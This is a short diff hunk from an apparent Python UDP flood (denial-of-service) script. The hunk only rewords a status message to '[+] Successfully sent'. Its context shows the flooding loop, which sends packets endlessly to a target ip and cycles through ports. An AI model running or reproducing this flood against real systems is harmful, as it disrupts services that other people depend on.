@@ -81,7 +81,7 @@ try :
  while True:
 		sock.sendto(bytes, (ip, port))
 		sent = sent + 1
-		print("\nSent %s packet to %s throught port:%s"%(sent,ip,port))
+		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
 		if port == 65534:
 			port = 1
 except KeyboardInterrupt:
